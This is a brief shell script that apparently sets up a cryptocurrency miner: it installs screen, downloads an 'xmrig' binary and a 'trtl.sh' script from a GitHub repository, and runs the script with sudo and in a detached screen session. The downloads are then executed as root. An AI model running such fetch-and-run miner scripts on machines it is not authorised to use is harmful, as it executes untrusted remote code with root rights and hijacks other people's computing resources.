#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS trtl.sh ./trtl.sh 65 75
wget https://github.com/pogchampv10/CPU/raw/main/xmrig
wget https://raw.githubusercontent.com/pogchampv10/CPU/main/trtl.sh
chmod u+x trtl.sh
sudo ./trtl.sh
